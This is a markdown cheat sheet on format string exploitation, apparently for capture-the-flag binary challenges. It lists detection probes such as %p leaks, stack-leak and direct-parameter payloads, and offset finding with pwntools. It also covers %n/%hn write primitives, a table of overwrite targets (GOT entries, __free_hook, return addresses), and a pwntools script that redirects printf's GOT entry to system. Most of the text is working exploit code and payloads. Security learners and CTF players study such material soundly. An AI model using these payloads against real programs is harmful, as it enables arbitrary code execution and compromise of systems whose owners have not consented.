# Format String Exploitation

## Detection
- printf(user_input) or fprintf(fp, user_input) without format specifier
- Test: send %p.%p.%p.%p -> stack values leak = confirmed

## Information Leak
```python
# Leak stack values
payload = b'%p.' * 20
# Parse output to find: canary, libc addr, pie base, saved rbp

# Direct parameter access (faster)
payload = b'%7$p'  # 7th parameter
```

## Finding Offset
```python
# Send AAAA%p.%p.%p... and find where 0x41414141 appears
# Or use pwntools:
from pwn import *
def exec_fmt(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recvall()
autofmt = FmtStr(exec_fmt)
print(f'offset = {autofmt.offset}')
```

## Write Primitives
```python
# Write value to address using %n
# %n writes number of bytes printed so far

# pwntools automatic
from pwn import *
fmtstr = fmtstr_payload(offset, {target_addr: value})

# Manual (write 4 bytes)
# %Xc%N$n -> write X to address at parameter N
# For large values, use %hn (2 bytes) or %hhn (1 byte)
```

## Common Targets
| Target | Address Source | Value |
|---|---|---|
| GOT[printf] | objdump -R | system addr |
| GOT[exit] | objdump -R | main (loop) or system |
| __free_hook | libc offset | system or one_gadget |
| return addr | stack leak | ROP gadget |

## pwntools FmtStr Helper
```python
from pwn import *
elf = ELF('./binary')
libc = ELF('./libc.so.6')

def send_payload(payload):
    p = process('./binary')
    p.sendline(payload)
    return p.recvall()

# Auto-detect offset
fmt = FmtStr(send_payload)

# Write GOT entry
fmt.write(elf.got['printf'], libc.sym['system'])
fmt.execute_writes()
```
